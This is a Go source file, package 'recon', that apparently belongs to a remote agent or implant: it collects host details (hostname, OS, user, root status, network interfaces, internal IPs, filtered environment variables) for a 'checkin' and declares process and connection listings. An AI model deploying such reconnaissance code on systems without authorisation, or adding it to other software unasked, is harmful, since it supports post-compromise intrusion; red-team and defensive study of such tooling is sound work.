// Package recon provides host reconnaissance: system info, process list, network.
package recon

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
)

// HostInfo is collected once at checkin.
type HostInfo struct {
	Hostname    string       `json:"hostname"`
	OS          string       `json:"os"`
	Arch        string       `json:"arch"`
	CPUs        int          `json:"cpus"`
	Username    string       `json:"username"`
	HomeDir     string       `json:"home"`
	IsRoot      bool         `json:"is_root"`
	Interfaces  []NetIface   `json:"interfaces"`
	InternalIPs []string     `json:"internal_ips"`
	ExternalIP  string       `json:"external_ip,omitempty"`
	Env         []string     `json:"env,omitempty"`
}

// NetIface represents a network interface.
type NetIface struct {
	Name    string   `json:"name"`
	Addrs   []string `json:"addrs"`
	MAC     string   `json:"mac"`
	Up      bool     `json:"up"`
}

// ProcInfo represents a running process.
type ProcInfo struct {
	PID     int    `json:"pid"`
	PPID    int    `json:"ppid"`
	Name    string `json:"name"`
	User    string `json:"user,omitempty"`
	Cmdline string `json:"cmdline,omitempty"`
}

// NetConn represents an active network connection.
type NetConn struct {
	Proto       string `json:"proto"`
	LocalAddr   string `json:"local"`
	RemoteAddr  string `json:"remote"`
	State       string `json:"state"`
}

// Collect gathers full host information.
func Collect() *HostInfo {
	hostname, _ := os.Hostname()
	home, _ := os.UserHomeDir()

	info := &HostInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		CPUs:     runtime.NumCPU(),
		Username: currentUser(),
		HomeDir:  home,
		IsRoot:   os.Getuid() == 0,
	}

	// Network interfaces
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			ni := NetIface{
				Name: iface.Name,
				MAC:  iface.HardwareAddr.String(),
				Up:   iface.Flags&net.FlagUp != 0,
			}
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				ni.Addrs = append(ni.Addrs, addr.String())
				// Collect non-loopback IPs
				if ip, _, err := net.ParseCIDR(addr.String()); err == nil {
					if !ip.IsLoopback() {
						info.InternalIPs = append(info.InternalIPs, ip.String())
					}
				}
			}
			info.Interfaces = append(info.Interfaces, ni)
		}
	}

	// Selective env (no secrets)
	safeEnvKeys := []string{"PATH", "LANG", "TERM", "SHELL", "LOGNAME",
		"USER", "USERNAME", "COMPUTERNAME", "SYSTEMROOT", "WINDIR"}
	for _, e := range os.Environ() {
		for _, k := range safeEnvKeys {
			if strings.HasPrefix(e, k+"=") {
				info.Env = append(info.Env, e)
				break
			}
		}
	}

	return info
}

// ProcessList returns running processes (platform-specific implementation below).
func ProcessList() ([]ProcInfo, error) {
	return getProcessList()
}

// NetworkConnections returns active TCP/UDP connections.
func NetworkConnections() ([]NetConn, error) {
	return getNetworkConnections()
}

func currentUser() string {
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	return fmt.Sprintf("uid=%d", os.Getuid())
}
